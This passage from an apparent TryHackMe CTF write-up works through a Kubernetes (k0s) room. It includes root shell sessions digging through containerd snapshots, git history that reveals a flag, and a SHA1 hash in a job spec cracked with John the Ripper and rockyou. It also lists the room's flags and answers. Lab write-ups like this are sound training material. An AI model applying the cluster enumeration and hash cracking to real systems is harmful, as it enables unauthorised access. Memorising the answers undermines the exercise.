+output as initial ADDED events.
+      --raw='': Raw URI to request from the server.  Uses the transport specified by the kubeconfig file.
+  -R, --recursive=false: Process the directory used in -f, --filename recursively. Useful when you want to manage
+related manifests organized within the same directory.
+  -l, --selector='': Selector (label query) to filter on, supports '=', '==', and '!='.(e.g. -l key1=value1,key2=value2)
+      --server-print=true: If true, have the server return the appropriate table output. Supports extension APIs and
+CRDs.
+      --show-kind=false: If present, list the resource type for the requested object(s).
+      --show-labels=false: When printing, show all labels as the last column (default hide labels column)
+      --show-managed-fields=false: If true, keep the managedFields when printing objects in JSON or YAML format.
+      --sort-by='': If non-empty, sort list types using this field specification.  The field specification is expressed
+as a JSONPath expression (e.g. '{.metadata.name}'). The field in the API resource specified by this JSONPath expression
+must be an integer or a string.
+      --template='': Template string or path to template file to use when -o=go-template, -o=go-template-file. The
+template format is golang templates [http://golang.org/pkg/text/template/#pkg-overview].
+  -w, --watch=false: After listing/getting the requested object, watch for changes.
+      --watch-only=false: Watch for changes to the requested object(s), without listing/getting first.
+
+Usage:
+  k0s kubectl get
+[(-o|--output=)json|yaml|name|go-template|go-template-file|template|templatefile|jsonpath|jsonpath-as-json|jsonpath-file|custom-columns-file|custom-columns|wide]
+(TYPE[.VERSION][.GROUP] [NAME | -l label] | TYPE[.VERSION][.GROUP]/NAME ...) [flags] [options]
+
+Use "k0s kubectl options" for a list of global command-line options (applies to all commands).
+
+root@johnny:~/.ssh# k0s kubectl get pods -A
+NAMESPACE     NAME                              READY   STATUS      RESTARTS   AGE
+internship    internship-job-5drbm              0/1     Completed   0          332d
+kube-system   kube-router-vsq85                 1/1     Running     0          332d
+kube-system   metrics-server-74c967d8d4-pvv8l   1/1     Running     0          332d
+kube-system   kube-api                          1/1     Running     0          332d
+kube-system   coredns-6d9f49dcbb-9vbff          1/1     Running     0          332d
+kube-system   kube-proxy-jws4q                  1/1     Running     0          332d
+
+root@johnny:~/.ssh# k0s kubectl exec -it kube-api --namespace=kube-system -- bash
+Error from server: error dialing backend: dial tcp 10.0.2.15:10250: i/o timeout
+
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots# ls
+1   11  13  15  17  19  21  23  25  27  29  30  32  34  36  38  4   41  43  5  7  9
+10  12  14  16  18  20  22  24  26  28  3   31  33  35  37  39  40  42  44  6  8
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots# cd 38
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38# ls
+fs  work
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38# cd fs
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs# ls
+home
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs# cd home
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home# ls
+ubuntu
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home# cd ubuntu
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu# ls
+jokes
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu# cd jokes
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# ls
+crush.jokes  dad.jokes  mom.jokes  programming.jokes
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# ls -lah
+total 28K
+drwxr-xr-x 3 root root 4.0K Feb  7  2022 .
+drwxr-xr-x 3 root root 4.0K Feb  7  2022 ..
+-rw-r--r-- 1 root root 1.3K Feb  7  2022 crush.jokes
+-rw-r--r-- 1 root root  718 Feb  7  2022 dad.jokes
+drwxr-xr-x 8 root root 4.0K Feb  7  2022 .git
+-rw-r--r-- 1 root root  997 Feb  7  2022 mom.jokes
+-rw-r--r-- 1 root root 1.2K Feb  7  2022 programming.jokes
+
+https://git-scm.com/docs/git-log
+
+https://education.github.com/git-cheat-sheet-education.pdf
+
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# git log
+commit 224b741fa904ee98c75913eafbefa12ac820659f (HEAD -> master, origin/master, origin/HEAD)
+Author: Aju100 <ajutamang10@outlook.com>
+
+    feat: add programming.jokes
+
+commit 22cd540f3df22a2f373d95e145056d5370c058f5
+Author: Aju100 <ajutamang10@outlook.com>
+
+    feat: add crush.jokes
+
+commit 4b2c2d74b31d922252368c112a3907c5c1cf1ba3
+Author: Aju100 <ajutamang10@outlook.com>
+
+    feat: add cold.joke
+
+commit 2be20457c290fa1e8cc8d18cd5b546cec474691c
+Author: Aju100 <ajutamang10@outlook.com>
+
+    feat: add mom.jokes
+
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# git log --pretty=oneline
+224b741fa904ee98c75913eafbefa12ac820659f (HEAD -> master, origin/master, origin/HEAD) feat: add programming.jokes
+22cd540f3df22a2f373d95e145056d5370c058f5 feat: add crush.jokes
+4b2c2d74b31d922252368c112a3907c5c1cf1ba3 feat: add cold.joke
+2be20457c290fa1e8cc8d18cd5b546cec474691c feat: add mom.jokes
+cc342469e2a4894e34a3e6cf3c7e63603bd4753e feat: add dad.jokes
+
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# git show 224b741fa904ee98c75913eafbefa12ac820659f
+commit 224b741fa904ee98c75913eafbefa12ac820659f (HEAD -> master, origin/master, origin/HEAD)
+Author: Aju100 <ajutamang10@outlook.com>
+
+    feat: add programming.jokes
+
+diff --git a/programming.jokes b/programming.jokes
+new file mode 100644
+index 0000000..7abc404
+--- /dev/null
++++ b/programming.jokes
+@@ -0,0 +1,10 @@
++
++Software undergoes beta testing shortly before it’s released. Beta is Latin for “still doesn’t work. (Anonymous)
++Programming today is a race between software engineers striving to build bigger and better idiot-proof programs, and the universe trying to produce bigger and better idiots. So far, the universe is winning. (Rick Cook)
++It’s a curious thing about our industry: not only do we not learn from our mistakes, but we also don’t learn from our successes. (Keith Braithwaite)
++There are only two kinds of programming languages: those people always bitch about and those nobody uses. (Bjarne Stroustrup)
++In order to understand recursion, one must first understand recursion. (Anonymous)
++The cheapest, fastest, and most reliable components are those that aren’t there. (Gordon Bell)
++The best performance improvement is the transition from the nonworking state to the working state. (J. Osterhout)
++The trouble with programmers is that you can never tell what a programmer is doing until it’s too late. (Seymour Cray)
++Don’t worry if it doesn’t work right. If everything did, you’d be out of a job. (Mosher’s Law of Software Engineering)
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# git show 22cd540f3df22a2f373d95e145056d5370c058f5
+commit 22cd540f3df22a2f373d95e145056d5370c058f5
+Author: Aju100 <ajutamang10@outlook.com>
+
+    feat: add crush.jokes
+
+diff --git a/crush.jokes b/crush.jokes
+new file mode 100644
+index 0000000..38c86e8
+--- /dev/null
++++ b/crush.jokes
+@@ -0,0 +1,16 @@
++Are you getting shorter? You seem to be inching closer to my heart.
++Are you talking to me? You’re not? Well then, please begin.
++Are you an extraterrestrial? Because you are out of this world!
++Aren’t you tired of running in my mind all day long?
++Can I borrow a kiss from you? Don’t worry I’ll give it back to you with interest.
++Did you know that the happiest place on earth is not Disneyland? It’s wherever you are!
++Do I really need to tell you a joke? Can’t we just kiss and be done with it?
++Do you know why I want to reshuffle the alphabet? It’s all for the sake of putting U and I together...forever.
++Excuse me, mind telling me what time it is? I must remember the exact time I met my soul mate!
++Here’s the deal: I will kiss you, and if you don’t like it, you can return it.
++I don’t mind falling over if it’s you I fall for.
++I wish I was the earth and you were the rain, so no matter what, you’d always fall for me.
++I’m gonna call the cops on you for stealing my heart.
++I’ve always thought happiness started with H. I just realized that all this time, it started with U.
++If you are here, then who is running heaven?
++Just a warning for you this Christmas. If a fat man in a red suit comes to pick you up, know that it’s because you’re on my wish list.
+\ No newline at end of file
+diff --git a/king.jokes b/king.jokes
+deleted file mode 100644
+index 1b7d703..0000000
+--- a/king.jokes
++++ /dev/null
+@@ -1 +0,0 @@
+
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# git show 4b2c2d74b31d922252368c112a3907c5c1cf1ba3
+commit 4b2c2d74b31d922252368c112a3907c5c1cf1ba3
+Author: Aju100 <ajutamang10@outlook.com>
+
+    feat: add cold.joke
+
+diff --git a/king.jokes b/king.jokes
+new file mode 100644
+index 0000000..1b7d703
+--- /dev/null
++++ b/king.jokes
+@@ -0,0 +1 @@
++THM{this_joke_is_cold_joke}
+\ No newline at end of file
+```
+What is the Pod flag?
+### Hack a Job at FANG
+You have been shortlisted and you have upcoming interview rounds for a FANG company! Find the secret that has been left behind.
+---
+I hope you have learned a lot through the challenges. Thank you so much for doing my first room and I want to personally thank [kiransau](https://tryhackme.com/p/kiransau). Feel free to provide feedback via [Twitter](https://twitter.com/pylang2).
+Answer the questions below
+```text
+https://kubernetes.io/docs/concepts/workloads/controllers/job/
+
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# k0s kubectl get pods -A
+NAMESPACE     NAME                              READY   STATUS      RESTARTS   AGE
+internship    internship-job-5drbm              0/1     Completed   0          332d
+kube-system   kube-router-vsq85                 1/1     Running     0          332d
+kube-system   metrics-server-74c967d8d4-pvv8l   1/1     Running     0          332d
+kube-system   kube-api                          1/1     Running     0          332d
+kube-system   coredns-6d9f49dcbb-9vbff          1/1     Running     0          332d
+kube-system   kube-proxy-jws4q                  1/1     Running     0          332d
+
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# k0s kubectl get jobs --namespace=internship -o json
+{
+    "apiVersion": "v1",
+    "items": [
+        {
+            "apiVersion": "batch/v1",
+            "kind": "Job",
+            "metadata": {
+                "annotations": {
+                    "batch.kubernetes.io/job-tracking": ""
+                },
+                "creationTimestamp": "2022-02-10T18:55:33Z",
+                "generation": 1,
+                "labels": {
+                    "controller-uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d",
+                    "job-name": "internship-job"
+                },
+                "name": "internship-job",
+                "namespace": "internship",
+                "resourceVersion": "579",
+                "uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d"
+            },
+            "spec": {
+                "backoffLimit": 6,
+                "completionMode": "NonIndexed",
+                "completions": 1,
+                "parallelism": 1,
+                "selector": {
+                    "matchLabels": {
+                        "controller-uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d"
+                    }
+                },
+                "suspend": false,
+                "template": {
+                    "metadata": {
+                        "creationTimestamp": null,
+                        "labels": {
+                            "controller-uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d",
+                            "job-name": "internship-job"
+                        }
+                    },
+                    "spec": {
+                        "containers": [
+                            {
+                                "command": [
+                                    "echo",
+                                    "26c3d1c068e7e01599c3612447410b5e56c779f1"
+                                ],
+                                "image": "busybox",
+                                "imagePullPolicy": "Always",
+                                "name": "internship-job",
+                                "resources": {},
+                                "terminationMessagePath": "/dev/termination-log",
+                                "terminationMessagePolicy": "File"
+                            }
+                        ],
+                        "dnsPolicy": "ClusterFirst",
+                        "restartPolicy": "Never",
+                        "schedulerName": "default-scheduler",
+                        "securityContext": {},
+                        "terminationGracePeriodSeconds": 30
+                    }
+                }
+            },
+            "status": {
+                "completionTime": "2022-02-10T18:59:26Z",
+                "conditions": [
+                    {
+                        "lastProbeTime": "2022-02-10T18:59:26Z",
+                        "lastTransitionTime": "2022-02-10T18:59:26Z",
+                        "status": "True",
+                        "type": "Complete"
+                    }
+                ],
+                "startTime": "2022-02-10T18:56:16Z",
+                "succeeded": 1,
+                "uncountedTerminatedPods": {}
+            }
+        }
+    ],
+    "kind": "List",
+    "metadata": {
+        "resourceVersion": "",
+        "selfLink": ""
+    }
+}
+
+root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# k0s kubectl get jobs -n internship -o json
+{
+    "apiVersion": "v1",
+    "items": [
+        {
+            "apiVersion": "batch/v1",
+            "kind": "Job",
+            "metadata": {
+                "annotations": {
+                    "batch.kubernetes.io/job-tracking": ""
+                },
+                "creationTimestamp": "2022-02-10T18:55:33Z",
+                "generation": 1,
+                "labels": {
+                    "controller-uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d",
+                    "job-name": "internship-job"
+                },
+                "name": "internship-job",
+                "namespace": "internship",
+                "resourceVersion": "579",
+                "uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d"
+            },
+            "spec": {
+                "backoffLimit": 6,
+                "completionMode": "NonIndexed",
+                "completions": 1,
+                "parallelism": 1,
+                "selector": {
+                    "matchLabels": {
+                        "controller-uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d"
+                    }
+                },
+                "suspend": false,
+                "template": {
+                    "metadata": {
+                        "creationTimestamp": null,
+                        "labels": {
+                            "controller-uid": "11cf55dc-7903-4b78-b9d3-62cf241ad26d",
+                            "job-name": "internship-job"
+                        }
+                    },
+                    "spec": {
+                        "containers": [
+                            {
+                                "command": [
+                                    "echo",
+                                    "26c3d1c068e7e01599c3612447410b5e56c779f1"
+                                ],
+                                "image": "busybox",
+                                "imagePullPolicy": "Always",
+                                "name": "internship-job",
+                                "resources": {},
+                                "terminationMessagePath": "/dev/termination-log",
+                                "terminationMessagePolicy": "File"
+                            }
+                        ],
+                        "dnsPolicy": "ClusterFirst",
+                        "restartPolicy": "Never",
+                        "schedulerName": "default-scheduler",
+                        "securityContext": {},
+                        "terminationGracePeriodSeconds": 30
+                    }
+                }
+            },
+            "status": {
+                "completionTime": "2022-02-10T18:59:26Z",
+                "conditions": [
+                    {
+                        "lastProbeTime": "2022-02-10T18:59:26Z",
+                        "lastTransitionTime": "2022-02-10T18:59:26Z",
+                        "status": "True",
+                        "type": "Complete"
+                    }
+                ],
+                "startTime": "2022-02-10T18:56:16Z",
+                "succeeded": 1,
+                "uncountedTerminatedPods": {}
+            }
+        }
+    ],
+    "kind": "List",
+    "metadata": {
+        "resourceVersion": "",
+        "selfLink": ""
+    }
+}
+
+using crackstation 26c3d1c068e7e01599c3612447410b5e56c779f1 : chidori
+
+naruto :)
+
+or john
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ nano hash_k0s
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_k0s 
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
+Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
+Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
+Use the "--format=ripemd-160" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
+Use the "--format=has-160" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+chidori          (?)     
+1g 0:00:00:00 DONE () 50.00g/s 556600p/s 556600c/s 556600C/s cobra..chidori
+Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
+Session completed.
+```
+What's the secret to the FANG interview?
+*chidori*
+
+## Flags / Answers
+- ***THM{yes_there_$s_no_$ecret}***
+- ***THM{this_joke_is_cold_joke}***
+
+## Notes / Lessons Learned
+[[0day]]
+
